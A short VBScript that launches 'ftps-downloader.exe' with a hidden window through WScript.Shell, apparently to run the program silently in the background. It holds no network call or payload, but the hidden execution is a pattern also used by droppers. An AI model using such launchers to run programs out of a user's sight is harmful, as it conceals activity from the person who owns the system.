Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "ftps-downloader.exe" & Chr(34), 0
Set WshShell = Nothing
